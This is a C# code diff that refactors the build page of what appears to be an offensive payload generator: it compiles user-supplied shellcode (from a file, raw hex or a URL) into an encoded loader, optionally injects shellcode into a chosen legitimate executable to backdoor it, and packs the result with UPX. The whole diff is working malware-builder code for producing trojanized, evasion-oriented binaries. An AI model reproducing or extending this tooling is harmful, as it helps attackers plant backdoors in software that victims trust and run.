@@ -26,6 +26,7 @@ public sealed partial class CompilePage : Page
     private List<CompilerToolCandidate>? _compilerCandidates;
 
     private bool _compilersDetected;
+    private readonly CliExecutor _cli = new();
 
     private static readonly string MinGwDownloadUrl = 
         "https://github.com/niXman/mingw-builds-binaries/releases/download/14.2.0-rt_v12-rev0/x86_64-14.2.0-release-win32-seh-ucrt-rt_v12-rev0.7z";
@@ -542,162 +543,82 @@ public sealed partial class CompilePage : Page
             _logger.Info("Starting Build Pipeline");
             _logger.Info("═══════════════════════════════════════════════");
 
-            // Get page references
+            var mainPage    = MainPage.Instance;
             var backdoorPage = BackdooringPage.Instance;
-            var packingPage = PackingPage.Instance;
-            
-            // Step 1: Compile the loader
+            var packingPage  = PackingPage.Instance;
+
+            if (mainPage == null)
+            {
+                ShowCompileResult(false, "Navigate to Payload page first to configure shellcode and template.");
+                return;
+            }
+
+            // ── Step 1: Compile payload via CLI ──────────────────────────
             CompileProgressText.Text = "Step 1: Compiling payload...";
             _logger.Info("\n[Step 1] Compiling payload loader...");
 
-            var mainPage = MainPage.Instance;
-            if (mainPage == null)
+            var (compiledExePath, cliCompileSuccess) = await RunCliCompileAsync(mainPage);
+
+            if (!cliCompileSuccess || compiledExePath == null)
             {
-                _logger.Error("Cannot compile: MainPage not found. Configure shellcode and template first.");
-                ShowCompileResult(false, "Configure shellcode and template on Payload page first.");
+                ShowCompileResult(false, "Compilation failed. Check the log for details.");
                 return;
             }
 
-            var coordinator = mainPage.Coordinator;
-            await coordinator.HandleSubmitAsync(mainPage);
-            
-            // Find the compiled output
-            var outputDir = string.IsNullOrEmpty(OutputPath.Text) 
-                ? _paths.EnsureTempSourceDirectory()
-                : OutputPath.Text;
+            _logger.Ok($"Compiled: {Path.GetFileName(compiledExePath)}");
+            var currentOutput = compiledExePath;
 
+            // Resolve final output directory
+            var outputDir = string.IsNullOrWhiteSpace(OutputPath.Text)
+                ? Path.GetDirectoryName(compiledExePath) ?? Path.GetTempPath()
+                : OutputPath.Text;
             Directory.CreateDirectory(outputDir);
 
-            var compiledExe = Directory.GetFiles(_paths.EnsureTempSourceDirectory(), "*.exe")
-                .OrderByDescending(f => File.GetLastWriteTime(f))
-                .FirstOrDefault();
-
-            if (compiledExe == null)
+            // Copy compiled exe to output dir if not already there
+            var finalInOutDir = Path.Combine(outputDir, Path.GetFileName(compiledExePath));
+            if (!string.Equals(compiledExePath, finalInOutDir, StringComparison.OrdinalIgnoreCase))
             {
-                ShowCompileResult(false, "Compilation failed. Check the log for errors.");
-                return;
+                File.Copy(compiledExePath, finalInOutDir, overwrite: true);
+                currentOutput = finalInOutDir;
             }
 
-            _logger.Ok($"Compiled: {Path.GetFileName(compiledExe)}");
-            var currentOutput = compiledExe;
-
-            // Step 2: Backdoor if enabled
+            // ── Step 2: Backdoor (optional) ──────────────────────────────
             if (backdoorPage?.IsBackdooringEnabled == true && backdoorPage.TargetPeFilePath != null)
             {
                 CompileProgressText.Text = "Step 2: Backdooring target PE...";
                 _logger.Info("\n[Step 2] Backdooring target executable...");
-
-                var backdoorOptions = new PeBackdoorOptions
-                {
-                    TargetPePath = backdoorPage.TargetPeFilePath,
-                    ShellcodePath = currentOutput, // Use compiled loader as "shellcode" (it needs to be shellcode actually)
-                    OutputPath = Path.Combine(outputDir, "backdoored_" + Path.GetFileName(backdoorPage.TargetPeFilePath)),
-                    Method = backdoorPage.SelectedInjectionMethod,
-                    CarrierInvoke = backdoorPage.SelectedCarrierInvoke,
-                    PreserveOriginalEntry = backdoorPage.PreserveOriginalEntry,
-                    PatchIat = backdoorPage.PatchIat,
-                    RemoveSignature = backdoorPage.RemoveSignature,
-                    PatchSubsystemToGui = backdoorPage.PatchSubsystemToGui
-                };
-
-                // For backdooring, we actually need the raw shellcode, not the exe
-                // The bin2shell output (from payload step) should have the shellcode
-                var shellcodeFile = Path.Combine(_paths.EnsureTempSourceDirectory(), "shellcode.bin");
-                if (File.Exists(shellcodeFile))
-                {
-                    backdoorOptions.ShellcodePath = shellcodeFile;
-                    var result = await _backdoorService.BackdoorAsync(backdoorOptions);
-
-                    if (result.Success)
-                    {
-                        _logger.Ok($"Backdoored: {Path.GetFileName(result.OutputPath)}");
-                        currentOutput = result.OutputPath;
-
-                        foreach (var step in result.Steps)
-                        {
-                            _logger.Info($"  • {step}");
-                        }
-                    }
-                    else
-                    {
-                        _logger.Warn($"Backdooring skipped: {result.ErrorMessage}");
-                    }
-                }
-                else
-                {
-                    _logger.Warn("Shellcode file not found. Backdooring skipped.");
-                }
+                currentOutput = await RunBackdoorStepAsync(backdoorPage, currentOutput, outputDir)
+                                ?? currentOutput;
             }
             else
             {
                 _logger.Info("\n[Step 2] Backdooring: Skipped (disabled)");
             }
 
-            // Step 3: Pack if enabled
+            // ── Step 3: Pack (optional) ───────────────────────────────────
             if (packingPage?.IsPackingEnabled == true && !string.IsNullOrEmpty(packingPage.UpxPath))
             {
                 CompileProgressText.Text = "Step 3: Packing with UPX...";
                 _logger.Info("\n[Step 3] Packing with UPX...");
-
-                var packedOutput = Path.Combine(outputDir, "packed_" + Path.GetFileName(currentOutput));
-                var upxArgs = packingPage.GetUpxArguments();
-
-                var psi = new ProcessStartInfo
-                {
-                    FileName = packingPage.UpxPath,
-                    Arguments = $"{upxArgs} -o \"{packedOutput}\" \"{currentOutput}\"",
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
-
-                using var proc = Process.Start(psi);
-                if (proc != null)
-                {
-                    var output = await proc.StandardOutput.ReadToEndAsync();
-                    var error = await proc.StandardError.ReadToEndAsync();
-                    await proc.WaitForExitAsync();
-
-                    if (proc.ExitCode == 0 && File.Exists(packedOutput))
-                    {
-                        _logger.Ok($"Packed: {Path.GetFileName(packedOutput)}");
-                        _logger.Info(output);
-                        currentOutput = packedOutput;
-                    }
-                    else
-                    {
-                        _logger.Warn($"Packing failed: {error}");
-                    }
-                }
+                currentOutput = await RunPackingStepAsync(packingPage, currentOutput, outputDir)
+                                ?? currentOutput;
             }
             else
             {
-                _logger.Info("\n[Step 3] Packing: Skipped (disabled or UPX not found)");
-            }
-
-            // Final output
-            var finalOutput = Path.Combine(outputDir, Path.GetFileName(currentOutput ?? "output.exe"));
-            if (!string.IsNullOrEmpty(currentOutput) && currentOutput != finalOutput)
-            {
-                File.Copy(currentOutput, finalOutput, true);
+                _logger.Info("\n[Step 3] Packing: Skipped (disabled)");
             }
 
             _lastOutputPath = outputDir;
 
             _logger.Info("\n═══════════════════════════════════════════════");
-            _logger.Ok($"Build complete! Output: {Path.GetFileName(finalOutput)}");
+            _logger.Ok($"Build complete! Output: {Path.GetFileName(currentOutput)}");
             _logger.Info("═══════════════════════════════════════════════");
 
-            ShowCompileResult(true, $"Success: {Path.GetFileName(finalOutput)}");
+            ShowCompileResult(true, $"Success: {Path.GetFileName(currentOutput)}");
 
             if (OpenFolderAfterCompile.IsChecked == true)
             {
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = outputDir,
-                    UseShellExecute = true
-                });
+                Process.Start(new ProcessStartInfo { FileName = outputDir, UseShellExecute = true });
             }
         }
         catch (Exception ex)
@@ -710,6 +631,245 @@ public sealed partial class CompilePage : Page
             CompileButton.IsEnabled = true;
             CompileProgressPanel.Visibility = Visibility.Collapsed;
         }
+    }
+
+    /// <summary>
+    /// Builds CLI compile arguments from the current MainPage state and runs the compile.
+    /// Returns (exePath, success).
+    /// </summary>
+    private async Task<(string? exePath, bool success)> RunCliCompileAsync(MainPage mainPage)
+    {
+        if (!_cli.IsAvailable)
+        {
+            _logger.Error($"CLI not found: {_cli.CliPath}");
+            return (null, false);
+        }
+
+        var args = new List<string> { "compile" };
+
+        // Shellcode source
+        switch (mainPage.CurrentShellcodeSource)
+        {
+            case ShellcodeSource.File:
+                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
+                if (string.IsNullOrEmpty(scFile) || !File.Exists(scFile))
+                {
+                    _logger.Error("Shellcode file not set or not found.");
+                    return (null, false);
+                }
+                args.AddRange(["-s", scFile]);
+                break;
+
+            case ShellcodeSource.Raw:
+                var hex = mainPage.ShellcodeRawTextBox.Text.Trim();
+                if (string.IsNullOrEmpty(hex))
+                {
+                    _logger.Error("Raw shellcode is empty.");
+                    return (null, false);
+                }
+                // Write hex to a temp .bin and pass as file
+                var tempBin = Path.Combine(Path.GetTempPath(), $"wm_raw_{Guid.NewGuid():N}.bin");
+                await File.WriteAllBytesAsync(tempBin, Convert.FromHexString(hex.Replace(" ", "").Replace("\n", "")));
+                args.AddRange(["-s", tempBin]);
+                break;
+
+            case ShellcodeSource.Url:
+                var url = mainPage.ShellcodeUrlTextBox.Text.Trim();
+                if (string.IsNullOrEmpty(url))
+                {
+                    _logger.Error("Shellcode URL is empty.");
+                    return (null, false);
+                }
+                args.AddRange(["--shellcode-url", url]);
+                break;
+
+            default:
+                _logger.Error($"Unsupported shellcode source: {mainPage.CurrentShellcodeSource}. Use File, Raw, or URL.");
+                return (null, false);
+        }
+
+        // Template
+        var templateId = mainPage.SelectedTemplateId;
+        if (!string.IsNullOrEmpty(templateId))
+            args.AddRange(["-t", templateId]);
+
+        // Encoder index
+        var encoderIndex = mainPage.SelectedEncoderIndex;
+        if (encoderIndex.HasValue)
+            args.AddRange(["-e", encoderIndex.Value.ToString()]);
+
+        // Envelope index
+        var envelopeIndex = mainPage.SelectedEnvelopeIndex;
+        if (envelopeIndex.HasValue)
+            args.AddRange(["-v", envelopeIndex.Value.ToString()]);
+
+        // Snippets — extract from visual tree
+        var uiData = Services.UiDataFactory.FromVisualTree(mainPage.ContentRoot);
+        foreach (var (key, value) in uiData.ComboBoxes)
+        {
+            if (key.StartsWith("snippetCombo_", StringComparison.Ordinal) && !string.IsNullOrEmpty(value))
+                args.AddRange(["--snippet", $"{key}={value}"]);
+        }
+
+        // JSON output for machine-readable result
+        args.Add("--json");
+
+        _logger.Info($"CLI: washmachine-cli {string.Join(" ", args.Select(a => a.Contains(' ') ? $"\"{a}\"" : a))}");
+
+        // Capture JSON from stdout, other lines to log
+        string? jsonLine = null;
+        var result = await _cli.RunAsync(args, line =>
+        {
+            if (line.TrimStart().StartsWith('{'))
+                jsonLine = line;
+            else
+                _logger.Info(line);
+        });
+
+        if (jsonLine == null && result.OutputLines.Count > 0)
+        {
+            // JSON might span multiple lines — try to find it
+            var fullOutput = result.Output;
+            var start = fullOutput.IndexOf('{');
+            var end   = fullOutput.LastIndexOf('}');
+            if (start >= 0 && end > start)
+                jsonLine = fullOutput[start..(end + 1)];
+        }
+
+        if (jsonLine == null)
+        {
+            _logger.Error("No JSON output from CLI compile.");
+            return (null, false);
+        }
+
+        try
+        {
+            using var doc = System.Text.Json.JsonDocument.Parse(jsonLine);
+            var root = doc.RootElement;
+
+            var success      = root.TryGetProperty("Success", out var sv) && sv.GetBoolean();
+            var sourcePath   = root.TryGetProperty("GeneratedSourcePath", out var sp) ? sp.GetString() : null;
+            var convSuccess  = root.TryGetProperty("ConversionSuccess", out var cv) && cv.GetBoolean();
+            var convError    = root.TryGetProperty("ConversionError", out var ce) ? ce.GetString() : null;
+
+            if (root.TryGetProperty("Notes", out var notes))
+                foreach (var note in notes.EnumerateArray())
+                    _logger.Info(note.GetString() ?? "");
+
+            if (!convSuccess && !string.IsNullOrEmpty(convError))
+                _logger.Error($"Compiler: {convError}");
+
+            if (!success || sourcePath == null)
+                return (null, false);
+
+            var exePath = Path.ChangeExtension(sourcePath, ".exe");
+            if (!File.Exists(exePath))
+            {
+                // Try finding latest exe in the same directory
+                var dir = Path.GetDirectoryName(sourcePath);
+                if (dir != null)
+                    exePath = Directory.GetFiles(dir, "*.exe")
+                                  .OrderByDescending(File.GetLastWriteTime)
+                                  .FirstOrDefault()
+                              ?? exePath;
+            }
+
+            return File.Exists(exePath) ? (exePath, true) : (null, false);
+        }
+        catch (Exception ex)
+        {
+            _logger.Error($"Failed to parse CLI output: {ex.Message}");
+            _logger.Info(jsonLine);
+            return (null, false);
+        }
+    }
+
+    private async Task<string?> RunBackdoorStepAsync(
+        BackdooringPage backdoorPage,
+        string currentExe,
+        string outputDir)
+    {
+        var targetPe = backdoorPage.TargetPeFilePath;
+        if (targetPe == null) return null;
+
+        // The shellcode for backdooring is the raw .bin (not the compiled loader)
+        // Look for the most recent shellcode in the GUI temp dir
+        var tempShellcodeDir = _paths.EnsureTempShellcodeDirectory();
+        var shellcodeBin = Directory.GetFiles(tempShellcodeDir, "*.bin", SearchOption.TopDirectoryOnly)
+                                    .OrderByDescending(File.GetLastWriteTime)
+                                    .FirstOrDefault();
+
+        if (shellcodeBin == null || !File.Exists(shellcodeBin))
+        {
+            _logger.Warn("Raw shellcode .bin not found for backdooring — skipping.");
+            return null;
+        }
+
+        if (!_cli.IsAvailable)
+        {
+            _logger.Warn("CLI not available — backdoor step skipped.");
+            return null;
+        }
+
+        var outFile = Path.Combine(outputDir, "backdoored_" + Path.GetFileName(targetPe));
+
+        var args = new List<string>
+        {
+            "backdoor",
+            "--pe",        targetPe,
+            "--shellcode", shellcodeBin,
+            "--output",    outFile,
+        };
+
+        var result = await _cli.RunAsync(args, line => _logger.Info(line));
+
+        if (result.Success && File.Exists(outFile))
+        {
+            _logger.Ok($"Backdoored: {Path.GetFileName(outFile)}");
+            return outFile;
+        }
+
+        _logger.Warn($"Backdooring failed (exit {result.ExitCode}).");
+        return null;
+    }
+
+    private async Task<string?> RunPackingStepAsync(
+        PackingPage packingPage,
+        string currentExe,
+        string outputDir)
+    {
+        var upxPath = packingPage.UpxPath;
+        if (string.IsNullOrEmpty(upxPath)) return null;
+
+        var packedOutput = Path.Combine(outputDir, "packed_" + Path.GetFileName(currentExe));
+        var upxArgs = packingPage.GetUpxArguments();
+
+        var psi = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName               = upxPath,
+            Arguments              = $"{upxArgs} -o \"{packedOutput}\" \"{currentExe}\"",
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            UseShellExecute        = false,
+            CreateNoWindow         = true,
+        };
+
+        using var proc = System.Diagnostics.Process.Start(psi);
+        if (proc == null) return null;
+
+        var output = await proc.StandardOutput.ReadToEndAsync();
+        var error  = await proc.StandardError.ReadToEndAsync();
+        await proc.WaitForExitAsync();
+
+        if (proc.ExitCode == 0 && File.Exists(packedOutput))
+        {
+            _logger.Ok($"Packed: {Path.GetFileName(packedOutput)}");
+            if (!string.IsNullOrWhiteSpace(output)) _logger.Info(output);
+            return packedOutput;
+        }
+
+        _logger.Warn($"UPX packing failed: {error}");
+        return null;
     }
 
     private void ShowCompileResult(bool success, string message)
